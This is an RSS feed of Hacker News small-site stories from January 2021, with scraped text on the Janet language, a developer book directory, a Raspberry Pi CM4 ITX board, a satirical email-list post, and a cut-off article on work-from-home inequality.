<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 11 Jan 2021 08:58:30 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 11 Jan 2021 08:58:30 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Why I am Janet]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25699138">thread link</a>) | @galfarragem
<br/>
January 9, 2021 | https://pan.earth/posts/why-i-am-janet.html | <a href="https://web.archive.org/web/*/https://pan.earth/posts/why-i-am-janet.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>In this installment I would like to show you in six cases, why is
<a href="https://janet-lang.org/">Janet</a> my programming language of choice.</p>
<h2>Case 1: Immutable or not</h2>
<p>I will start small: Janet has both mutable and immutable data structures for
all three usual suspects. So we have a buffer (mutable) and string (immutable),
also table (m) and struct (i), and indeed the array (m) and tuple (i). I
can understand the argument for immutable data, and respect it, but I love
the choice. Janet gives me that on every step, and yet guide me by its design.</p>
<h2>Case 2: Metal</h2>
<h3>C</h3>
<p>The fundamental property of the Janet language is the low-level nature of
the language implementation. C is the programming language used to implement
lots of parts; its parser, compiler, the virtual machine and a lot of the
functionality in the standard library.</p>
<p>This choice not only makes Janet fast and efficient, but it also brings
inspectability and transparency of the underlying mechanisms. Another benefit
is that there is the header file for the Janet C API, with which it is not
that hard to build your own C code or wrap some existing C code into your
library or embed Janet in other C program.</p>
<h3>Print</h3>
<p>In the spirit of the best Unix programs printing to the stdout is the
first-class citizen in the Janet language. For example, templating language
<a href="https://git.sr.ht/~bakpakin/temple">Temple</a> by the creator of the language
just prints. In the
<a href="https://github.com/janet-lang/spork/blob/master/spork/fmt.janet">formatting part</a>
of the <a href="https://github.com/janet-lang/spork">Spork</a>'s library base function
prints. The standard library has many functions for better work with the
printing, e.g. redirecting output.</p>
<h3>Threads</h3>
<p>The threads are also part of the core of the language. You can say what you
want when <a href="https://shouldiusethreads.com/">you should use the threads</a>
but sometimes it is very convenient to spin up threads for the hard
work. Especially if the threads are more similar to the erlang processes than
to the standard OS threads. Still, you have to use them safely, because of
the race conditions and locks.</p>
<h2>Case 3: OOP</h2>
<p>Now you have to think I have gone crazy. OOP in the functional language,
isn't it anti-pattern? I do not think so. Once I have been to
<a href="https://www.youtube.com/watch?reload=9&amp;v=uNPdZm5oF_E">talk</a> which
compared all three main paradigms. I took away that every paradigm has its
place and time for usage.</p>
<h3>Prototypes</h3>
<p>The OOP in Janet is the prototype-based one and backed by the table data
structure. You can easily set the prototype for the table with some properties
or behaviour, which is then inherited by your table.</p>
<h3>Messages</h3>
<p>The syntax for sending messages is easy. Call the keyword with the object
you are calling the message on as the first argument. This syntax is often
confusing for the people coming from the Clojure, because they can be used to
get the value from hashmap this way.</p>
<h3>Abstracts</h3>
<p>One exciting possibility emerging from this concept is that you can easily
teach messaging to your JanetAbstract objects written in the C language. Then
you have programs written in C looking just like ordinary Janet objects.</p>
<h2>Case 4: PEG</h2>
<p>As you may remember from the
<a href="https://pan.earth/posts/how-i-became-janet.html">How I became Janet</a>
post I was avid Rubyist. One of the quotes from Matz I like a lot is:</p>
<blockquote>
<p>There are only three things certain in programmers life:
taxes, death and parsing text.</p>
</blockquote>
<p>For this purpose, Janet uses
<a href="https://bakpakin.com/writing/how-janets-peg-works.html">PEG</a>. If you are
not sure, read the article to understand the concept better. With it, you
can create a small state machines, which can scan, parse and transform the
text into another form of the data.</p>
<h3>Oh so core</h3>
<p>What I love a lot about this particular implementation? That it is part of the
core of the language, again, you guessed, written in C. The PEG definition's
syntax is pure Janet code, very similar to how you write macros with all the
quoting, quasiquoting and unquoting. Its learning curve is steep, especially
if you strive for very optimal definitions, but once you get feel of it,
you will never look the same on a string of text. And you will finally
understand why you hated regex so much.</p>
<h3>Command and conquer</h3>
<p>One use case, where PEG shines for my particular interest is parsing the
interactive commands user input, mostly in TUI applications. I will discuss
this more in one later post, where I will write about my projects.</p>
<h2>Case 5: Dynamic</h2>
<h3>Environment</h3>
<p>The environment is just a Janet table, that holds all loaded bindings. The
one called root is used as a base, when you want to create a new one, for
example for the new fiber, you are creating, or when you are compiling your
code by hand.</p>
<h3>Modules and Loaders</h3>
<p>As is a custom in many languages, Janet has modules system to separate concerns
and divide code into smaller parts. By default, one source file maps to one
module and contains bindings and the environment. By importing a module, you
bring these to the current environment. But there are many other mechanisms,
how you can make this your own, some of them I will show in this part.</p>
<p>The loader is a mechanism that imports modules into the
environment. Interestingly, you can have loader not just for the Janet code,
image and native modules, but for whatever syntax. One lovely example is
the Temple library, which uses them to load your HTML (or any other) templates.</p>
<h3>Fibers</h3>
<p>The concept is very similar to the coroutines in other languages with one
caveat: it is also one of the base building blocks of the language and the
virtual machine. The fact also supports this: fiber contains a mechanism
for signalling, which helps differentiate the fiber's return, called
yielding. One of the usages touted by the language creator is capturing error
in the fiber's code, returned to the calling fiber. Yes, you are always in
the fiber, when you have Janet code running.</p>
<p>Right now the development version of the language contains generators,
based on fibers. Generators are similar to the Python ones, but due to the
status of the fibers as the first-class citizens of the language, they are
more natural in my view.</p>
<h3>ev</h3>
<p>Experimental and developing feature of the language added just in the latest
minor update, but great potential for the future. Maybe you already know what
it is: event loop in the core of the language! Just say how cool is that, and
with fibers as building blocks, it shines for anything async you throw at it
(if it does not block that is). Even as I am very excited about this feature,
I would rather wait for a little for it to mature and show all its facets.</p>
<h3>Compiling</h3>
<p>I know what you think; pepe just got out of ideas. No, I do not want to talk
about the fact, that Janet compiles the source code into virtual machine
bytecode, what I want to convey is that there is absolutely nothing wrong
for you as a programmer to grab some AST (probably provided by the language
parser) compile it and run compiled code. Or use some of the higher-level
mechanisms already present in the standard library as dofile or require.</p>
<p>I just used my minimal knowledge of programming language design to develop
Janet <a href="https://git.sr.ht/~pepe/jlnt.kak">linter</a> for the Kakoune editor,
which probably is not the best linter around, but works great for me.</p>
<p>And not only code but even PEGs you can compile for faster and more efficient
run, when their time comes.</p>
<h3>Macros</h3>
<p>As any other Lisp, and many other languages Janet has macros. With all said
above, I am not afraid of writing them and even use them in a way, that will
up many brows, I fear. Yes, we can use macros! Deal with it.</p>
<h2>Case 6: Grab bag</h2>
<h3>Tables</h3>
<p>As you may understand now, tables are everywhere in the language OOP,
environment and other places, and frankly quite common in other langs. So? In
my opinion, Janet's ones are top-notch, similarly to fibers, because they
are the very basic building block of the language design.</p>
<h3>Repl keys</h3>
<p>Standard Janet repl has already coded a lot of shortcut keys for navigating
and modifying input text. One of the good outcomes of this feature is that
all those are also present in standard library getline function. But for me,
there are two I use a lot and refuse to switch to remote repl from the editor:</p>
<ul>
<li>
<p>tab completes the binding you have started, even showing you the options,
when there are more than one.</p>
</li>
<li>
<p>ctrl+g shows the documentation for binding
under the cursor! You may know that thought: is the separator first or the
last parameter to this fn?</p>
</li>
</ul>
<p>And both are present when you use standard library getline; you provide the
table with bindings.</p>
<h3>Loop</h3>
<p>In the standard library, there is a macro loop, which is similar to those
in other Lisps. It also has sister macro seq, which gathers all the results
from all runs. I do not use it very often, but when I do, I praise it.</p>
<h2>To be continued ...</h2>
<p>That's all folks for this part. Next will be again little bit more
philosophical.</p>
<p>To understand all this better, be sure to read the
<a href="https://pan.earth/posts/how-i-became-janet.html">first installment</a>.</p>

    </div></div>]]>
            </description>
            <link>https://pan.earth/posts/why-i-am-janet.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25699138</guid>
            <pubDate>Sat, 09 Jan 2021 10:15:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: DevBooks – Help Developers find indy books]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25698707">thread link</a>) | @simon-holdorf
<br/>
January 9, 2021 | https://thesmartcoder.dev/books/ | <a href="https://web.archive.org/web/*/https://thesmartcoder.dev/books/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-server-rendered="true" id="__nuxt"><!----><div id="__layout"><div data-app="true" id="app" data-v-8b44678a=""><div> <main data-v-8b44678a=""><div><div data-v-405cec28="" data-v-8b44678a=""><div><div data-v-405cec28=""><div data-v-405cec28=""><div> <p data-v-405cec28="">
        Find the best books for developers.
      </p></div></div></div></div></div> <div data-v-8b44678a=""><div data-v-58ecdbbb="" data-v-8b44678a=""><div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><h2>What is DevBooks?</h2> <p>DevBooks helps developers to find the best books for developers and authors to showcase their amazing work. </p></div></div> </div> <div data-v-58ecdbbb=""><div data-v-58ecdbbb=""><div xs="12"><div> <div><h2>
        A React Developer’s Guide to Hooks
      </h2> <p>by Sebastien Castiel</p> <p>
        React Hooks are awesome, but they are not easy to use every day.
In my experience with React and hooks, I have faced a lot of issues, spent some time debugging to understand where these issues came fr...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Practical Test Automation
      </h2> <p>by Panos Matsinopoulos</p> <p>
        Learn the principles behind test-driven development (TDD) and behavior-driven development (BDD) and see how Jasmine, RSpec and Cucumber can be used to your advantage. This book examines some of the le...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Jest Handbook
      </h2> <p>by Hugo Di Francesco</p> <p>
        Learn Advanced JavaScript Testing patterns with Jest.

Take your JavaScript testing to the next level by learning the ins and outs of Jest, the top JavaScript testing library.
      </p></div>  </div></div><div xs="12"><div> <div><h2>
        Practical Bootstrap
      </h2> <p>by Panos Matsinopoulos</p> <p>
        Learn to use one of the most popular CSS frameworks and build mobile-friendly web pages. Used for numerous websites and applications, Bootstrap is a key tool for modern web development.
      </p></div>  </div></div><div xs="12"><div> <div><h2>
        The Coding Career Handbook
      </h2> <p>by Shawn Swyx Wang</p> <p>
        10 hours of audio. 40 chapters. 450+ pages. 1,400+ links to original sources curated over 3 years. Priceless insights from dozens of developers at the top of their fields. Proven ideas, tested by pers...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Tech Resume Inside Out
      </h2> <p>by Gergely Orosz</p> <p>
        What a good developer resume looks like, and how to write one. I've reviewed hundreds of developer resumes at tech companies like Microsoft, Skype, and Uber. This guide helps you craft a developer res...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Code Your Way Up
      </h2> <p>by Greg Thomas</p> <p>
        Code Your Way Up is the book for new developers looking to get started in software and asks the hard questions on growth, delivery, and initiative and what you need to think of in order to succeed.  I...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Lean from the Trenches
      </h2> <p>by Henrik Kniberg</p> <p>
        You know the Agile and Lean development buzzwords, you’ve read the books. But when systems need a serious overhaul, you need to see how it works in real life, with real situations and people. Lean fro...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        How to Get a Job in Web Development
      </h2> <p>by RealToughCandy</p> <p>
        "How to Get a Job in Web Development" is designed for junior web developers. 
In this book, you will learn how to:

• Expertly craft the ‘holy clover’ of application materials: your resume, cover lett...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Master HTML &amp; CSS
      </h2> <p>by Panos Matsinopoulos</p> <p>
        Want to become a Web developer? HTML and CSS are a must for your foundation. And this book takes you from zero to advanced level. From classical hello world things to how you can position elements on ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Letters To a New Developer
      </h2> <p>by Dan Moore</p> <p>
        Learn what you need to succeed as a developer beyond the code. The lessons in this book will supercharge your career by sharing lessons and mistakes from real developers. 

Wouldn’t it be nice to lear...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        How To Host, Secure, and Deliver Static Websites on Amazon Web Services
      </h2> <p>by Kyle Galbraith</p> <p>
        "How To Host, Secure, and Deliver Static Websites on Amazon Web Services" is a book and video course that cuts through the sea of information to accelerate your learning of AWS. Giving you a learning ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Road to GraphQL
      </h2> <p>by Robin Wieruch</p> <p>
        The Road to GraphQL is your personal journey to master pragmatic GraphQL in JavaScript. The book is full with applications you are going to build along the way with React.js and Node.js. Afterward, yo...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Portfolio Surgery
      </h2> <p>by RealToughCandy</p> <p>
         In Portfolio Surgery, you'll start with a massive upgrade of the look and feel of your portfolio. You'll learn about common pitfalls, dos and don'ts, and portfolio optimization techniques. Then, in t...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Pure React
      </h2> <p>by Dave Ceddia</p> <p>
        Learning new skills is one of the best ways to invest in yourself.

Knowing React can be the deciding factor in getting hired for a new job, or set you up for a promotion at your current one.

You cou...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Good Parts of AWS
      </h2> <p>by Daniel Vassallo</p> <p>
        This is a book by Daniel Vassallo and Josh Pschorr. Between us, we have worked with AWS for 15 years, including 11 years working inside AWS. We have worked on all sorts of web applications, from small...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Practical Vavr
      </h2> <p>by Alexandre Grison</p> <p>
        Practical Vavr is all about making you want to use Vavr in your day to day Java programming.

If you want to improve the quality of your code by using a well-thought and beautifully designed functiona...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Your First Year in Code
      </h2> <p>by Isaac Lyman</p> <p>
        Starting a career in programming can be intimidating. Whether you're switching careers, joining a boot camp, starting a C.S. degree, or learning on your own, Your First Year in Code can help, with pra...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Building an Effective Dev Portfolio
      </h2> <p>by Josh Comeau</p> <p>
        I got so many replies! A couple hundred developers were willing to share their portfolios with me, and I went through as many as I could over the next couple of weeks. I found I kept giving the same f...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        PHP Mentors - Advice from PHP Experts around the world
      </h2> <p>by Flávio Silveira</p> <p>
        Answers from PHP masters around the world for your questions.
Code, Career, Team work, Working environment, Logs, Tests, Future and much more.

PHP Mentors Book is a set of questions with topics that ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Case of IBM 386 PC: A Detective Story for Techies
      </h2> <p>by Jim Grep</p> <p>
        Take a break, have some fun reading a tech mystery story on programming--a first of its kind. A nostalgic story from the early days of IBM PC when some programmers get together to play detective and h...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Freelance Newbie
      </h2> <p>by RealToughCandy</p> <p>
        Are you ready to jump-start your freelance web development career? Freelance Newbie has you covered! In this book, you’ll learn practical, actionable steps you can start using TODAY to get your first ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        14 Habits of Highly  Productive Developers
      </h2> <p>by Zeno Rocha</p> <p>
        You can learn the most popular frameworks, use the best programming languages, and work at the biggest tech companies, but if you cultivate bad habits, it will be hard for you to become a top develope...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Content for Developers
      </h2> <p>by Maedah Batool</p> <p>
        A whole new workflow to Write. Publish. Market. Authentic &amp; professional content writing meant for developers. Zero bull-shit and to-the-point tips to improve your technical content writing skills. Le...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        A Smart Guide for Your Career as a Software Engineer
      </h2> <p>by Mike Nikles</p> <p>
        I started my software engineer career 20 years ago. Since then, I have interviewed hundreds of candidates and reviewed even more resumes. This book is a guide for your own career, whether you are new ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Outstanding Developer
      </h2> <p>by Sebastien Castiel</p> <p>
        Being a developer is not only about writing code. And improving as a developer is not only about improving in writing code. This book explores how to become an outstanding developer through several ax...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        5 Little Potions
      </h2> <p>by Mark Wilbur</p> <p>
        In 5 Little Potions, you'll begin your journey into Elixir programming by creating increasingly complex games.

You'll start with a simple guessing game. Next you'll work with Elixir Structs in a boar...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Distributed Systems with Node.js
      </h2> <p>by Thomas Hunter II</p> <p>
        In this hands-on guide, author Thomas Hunter II proves that Node.js is just as capable as traditional enterprise platforms for building services that are observable, scalable, and resilient. Intermedi...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Data Analysis with Rust Notebooks
      </h2> <p>by Dr. Shahin Rostami</p> <p>
        A practical book on Data Analysis with Rust Notebooks that teaches you the concepts and how they're implemented in practice.

- All code examples in Rust,
- Rust (Jupyter) Notebooks for each Section,
...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Python re(gex)?
      </h2> <p>by Sundeep Agarwal</p> <p>
        This book will help you learn Python Regular Expressions, a mini-programming language for all sorts of text processing needs.

The book heavily leans on examples to present features of regular express...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Road to React
      </h2> <p>by Robin Wieruch</p> <p>
        In "The Road to React" you will learn about all the fundamentals of React.js with Hooks while building a full-blown React application step by step. While you create the React application, every chapte...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        Cloud Native Web Development
      </h2> <p>by Mike Nikles</p> <p>
        In this book, we will walk through the end-to-end process of developing a cloud-native web application. You will learn technologies, processes, tips &amp; tricks and gain hands-on experience. You will fin...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Road to Firebase
      </h2> <p>by Robin Wieruch</p> <p>
        The Road to React with Firebase is your personal journey to master advanced React for business web applications in JavaScript whereas Firebase is used to replace everything that you would want from a ...

        <span>more</span></p></div>  </div></div><div xs="12"><div> <div><h2>
        The Standout Developer
      </h2> <p>by Randall Kanna</p> <p>
        If you’re tired of the endless job search and feeling like your resume isn’t being seen, this book will help you craft a great resume that stands out and get it seen by the companies you want. I’ll sh...

 …</p></div></div></div></div></div></div></div></div></div></div></div></main></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thesmartcoder.dev/books/">https://thesmartcoder.dev/books/</a></em></p>]]>
            </description>
            <link>https://thesmartcoder.dev/books/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25698707</guid>
            <pubDate>Sat, 09 Jan 2021 08:43:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learning Elixir's GenServer with a real-world example]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25698520">thread link</a>) | @kimi
<br/>
January 8, 2021 | https://papercups.io/blog/genserver | <a href="https://web.archive.org/web/*/https://papercups.io/blog/genserver">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://papercups.io/blog/genserver</link>
            <guid isPermaLink="false">hacker-news-small-sites-25698520</guid>
            <pubDate>Sat, 09 Jan 2021 07:57:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Over: Board – Raspberry Pi CM4 ITX Motherboard]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25697993">thread link</a>) | @todsacerdoti
<br/>
January 8, 2021 | https://blog.jmdawson.co.uk/overboard-raspberry-pi-cm4-itx-motherboard/ | <a href="https://web.archive.org/web/*/https://blog.jmdawson.co.uk/overboard-raspberry-pi-cm4-itx-motherboard/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3401">

	

	<div>
		
<p>The Over:Board is an IO board for the Raspberry Pi Compute Module 4. It is designed to use a standard PC ATX power connector and features a full size PCI-E 16x slot although its only running at 1x bandwidth and unfortunately it is not compatible with a GPU.   <br></p>



<figure><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201%201'%3E%3C/svg%3E" data-src="https://c0.iggcdn.com/indiegogo-media-prod-cld/image/upload/c_fill,w_762,g_center,q_auto:best,dpr_1.6,f_auto,h_506/fjlirebv3qpqd7xdlsek" alt="The Over:Board" data-old-src="https://c0.iggcdn.com/indiegogo-media-prod-cld/image/upload/c_fill,w_762,g_center,q_auto:best,dpr_1.6,f_auto,h_506/fjlirebv3qpqd7xdlsek" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>The Over:Board</figcaption></figure>



<p><br>It breaks out the following ports: <br></p>



<ul><li>24-pin ATX Power</li><li>40-pin GPIO</li><li>Full Size PCI-E @ 1x bandwidth</li><li>SATA Controller (Powered by USB)</li><li>Front Panel Header</li><li>CPU Fan Header</li><li>UART Header</li><li>Micro USB</li><li>RS232 Com Port</li><li>2x USB 2.0 Ports</li><li>Micro SD card slot</li><li>3.5mm Audio</li></ul>



<p>The Over:Board costs £199 for an early prototype or £99 for the Final Production board and is available to back now on indiegogo. <br></p>



<div><p>Whilst £99 is expensive for a IO board this is likely down to the limited production and it is likely still the cheapest ARM based ITX motherboard on the market even when factoring in the cost of a RPI CM4. </p><p>You can back the Over:Board on indiegogo <a rel="noreferrer noopener" href="https://www.indiegogo.com/projects/over-board-raspberry-pi-4-mini-itx-motherboard#/" target="_blank">here</a></p><p>For another ARM IO board with SATA check out my Nano Pi Neo2 NAS review <a rel="noreferrer noopener" href="https://blog.jmdawson.co.uk/nano-pi-neo2-nas-enclosure-a-small-linux-home-server-nas/" target="_blank">here</a></p><p>The project currently has £1654 in backing from 11 backers. With 28 days left it is looking likely to hit its £5000 target. </p><p>Ross Nicoholls is leading the campaign: </p></div>



<blockquote><p>I’ve lost count exactly how many, but this will be about my 35th commercial electronics PCB to be manufactured, so I am no stranger to getting these things to market. That said however, this will be the first of my own venture so represents my most exciting project to date and something I feel very passionate about.</p><cite>Ross has lots of experience in this field</cite></blockquote>



<p>I wish Ross good luck and hope to see the Over:Board available soon! </p>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>https://blog.jmdawson.co.uk/overboard-raspberry-pi-cm4-itx-motherboard/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25697993</guid>
            <pubDate>Sat, 09 Jan 2021 06:31:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to grow your email list to three subscribers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25697859">thread link</a>) | @nadermx
<br/>
January 8, 2021 | https://johnathannader.com/how-grow-your-email-list-three-subscribers/ | <a href="https://web.archive.org/web/*/https://johnathannader.com/how-grow-your-email-list-three-subscribers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    
    <div>
      <div>
        
        <p>john | Jan. 9, 2021, 6:09 a.m.</p>
        <p>Over the past twenty five years as a prolific internet user I have been able to accomplish many feats.&nbsp; Some of which have garnered the attention of governments, others of family members.&nbsp; None of these though are as profound as the truly difficult feat of growing my subscriber list.</p><p>You would think that growing a list to three users would be something down right nearly impossible, as I did too.&nbsp; But in reality it turned out to be even harder than that!</p><p>Don't worry though, I wont lead you down the path of struggles and tribulations to get your self to three subscribers, I will instead show you the light at the end of the tunnel in a quick and simple walk through guide.</p><p>Obviously most people would wonder, "Wow John, how did you do it?" and thankfully I have an answer for you, it's simple really.&nbsp; Build a blog.&nbsp; After you have done this, put a email subscriber list at the bottom.</p><p>But that's not all, oh no I also thought just like I was promised by the field of dreams that if I build it, they will come.&nbsp; That was false, once I built the blog no one came.&nbsp; Thankfully that didn't matter or stop me from getting subscribers.</p><p>Instead once I had done the hard part of building the blog, and putting a email subscriber list on the bottom, I had to do the absolute most terrifying thing.&nbsp; Write a blog post.</p><p>Now of course most of you think, "By golly I'm terrible at writing, how will I ever get to three subscribers?" and for you I have an answer, write a test blog post.&nbsp; Something as complicated as "test blog post".</p><p>I know this may be daunting, but don't worry this will simply get all the pent up subscriber demand frothing at the mouth hoping for your next post.&nbsp; Of course this wont make them subscribe, but this will make you be very well on your way to your first subscriber.</p><p>Once you have made the test blog post, do the impossible.&nbsp; Go from zero to one, subscribe yourself to your blog.</p><p>Now of course this is a monumental moment for your blog and subscriber list.&nbsp; You should in reality pat yourself on the back.&nbsp; You have managed the mathematical improbability of growing at infinity percent.</p><p>Of course once you have relished in the joy that is your first subscriber, then forget you have a blog for a while.&nbsp; This is crucial, as patience is key for success.&nbsp; </p><p>Out of the blue once you get outraged at something in life, then write your second blog post.&nbsp; Call this post, First post.</p><p>To keep the potential subscribers believing that it is in fact your first post, and not the post that brought you from zero to one, delete the test post.&nbsp; Perhaps even maybe have a nice little digital funeral for it in which you wish it the best in the after life, and then move on.</p><p>After you successfully published the First post, do the unthinkable and send it to a friend, specifically asking them if the newsletter subscription works.<br></p><p>Congratulations, you have now gotten subscriber number two!&nbsp; Look at you go!</p><p>Now I have lead you this far, of course to reach post number three, well I got nothing on that one, that one just simply takes a bit of luck.<br></p>
      
       <p>P.S. Subscribe to my <a href="https://johnathannader.com/newsletter/">newsletter</a> and follow me on <a href="https://twitter.com/nadermx" rel="nofollow noopener" target="_blank">twitter</a></p>
      </div>
    

    </div>
  </div>
</div></div>]]>
            </description>
            <link>https://johnathannader.com/how-grow-your-email-list-three-subscribers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25697859</guid>
            <pubDate>Sat, 09 Jan 2021 06:10:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Expanded work-from-home boosts income for select few, worsening inequality]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25697771">thread link</a>) | @rustoo
<br/>
January 8, 2021 | https://academictimes.com/expanded-work-from-from-home-boosts-income-for-select-few-worsening-inequality-study-finds/ | <a href="https://web.archive.org/web/*/https://academictimes.com/expanded-work-from-from-home-boosts-income-for-select-few-worsening-inequality-study-finds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="articleBody"><p dir="ltr">Giving employees greater ability to work from home increases average income, but the benefit goes mostly to already high-earning workers, new research shows, indicating how policies implemented in response to the coronavirus pandemic could widen economic inequality.</p><p dir="ltr">Published in the <em>Journal of Population Economics</em>, the <a href="https://link.springer.com/article/10.1007/s00148-020-00800-7">paper</a> authored by Italian economists Luca Bonacini, Giovanni Gallo and Sergio Scicchitano found that increasing overall ability to work from home primarily helps workers who are male, older, highly educated and already highly paid.Â&nbsp;</p><p dir="ltr">Before the pandemic, employees who typically worked from home were often female, older, highly educated and living in metropolitan cities.</p><p dir="ltr">Using data from Italyâ€™s 2018 Survey on Labour Participation and Unemployment and the 2013 Italian Survey of Professions, the researchers tested what would happen if work-from-home became the modus operandi rather than a forced innovation. By swapping a 10 percentage point share of employees from a â€œlow feasibilityâ€� level of working from home to a â€œhigh feasibilityâ€� level, average income increased by 1% while the Gini index, a measure of income inequality, increased by 0.4.</p><p dir="ltr">A Gini index of 100 is the maximum level of income inequality; Italy had a Gini index of 35.9 in 2017, according to the World Bank.</p><p dir="ltr">Italy was used as a case study for the paper, published Sept. 12, because it was the first Western country to adopt an economic lockdown to prevent the spread of the coronavirus. The country also showed a particularly dramatic shift toward work-from-home as a result of the pandemic.Â&nbsp;</p><p dir="ltr">Prior to the coronavirus, Italyâ€™s share of remote workers was the lowest of any European country at 1%. As of June, roughly 90% of the countryâ€™s public sector workers were working from home, according to the Italian Minister of Administration.</p><p dir="ltr">Although the researchers relied on data from Italy, they said their findings â€œmay be useful to policymakers in other developed countries as wellâ€� as governments rethink production processes to incorporate more robust work-from-home policies.</p><p dir="ltr">In the U.S., for example, the pandemic quadrupled the number of people working from home to nearly 50% of the total workforce, and many countries are developing pandemic exit plans with continued high levels of work-from-home at the center.</p><p dir="ltr">Many companies, having invested time, energy and money into training and equipment for remote employees, are also likely to expand work-from-home policies even after the threat of COVID-19 has receded. Workers, managers and entrepreneurs have also spent months developing remote-working skills that they are unlikely to give up on, Scicchitano said.</p><p dir="ltr">If working from home becomes the new normal, the researchers said, â€œtemporary income support measures,â€� such as direct financial payments to citizens, â€œwill not be sufficient anymoreâ€� to prevent remote work from exacerbating income inequality.</p><p dir="ltr">Instead, officials need to focus on policies that could better assist employees who work from home, Scicchitano said, such as increased child care facilities and financial support for families, increased the school enrollment rates and improved training courses for employees. Further worsening inequality from large-scale shifts, not every job can be done from home, creating classes of workers lacking in additional benefits that come from doing jobs remotely.Â&nbsp;</p><p dir="ltr">Jobs in finance and insurance, communication and information and professional services â€” typically some of the higher-paying professions â€” can more easily be done remotely than jobs in hotels, restaurants and agriculture, which typically pay less, according to Scicchitano.</p><p dir="ltr">â€œAnd obviously in some sectors, there is a higher share of workers who are able to work from home,â€� he said in an interview with The Academic Times. â€œEven in this case, there are huge inequalities in the labor market.â€�</p><p dir="ltr">The researchers are currently working on a follow-up paper, set to be finished in the next month, investigating the impact that working from home has specifically had on the gender pay 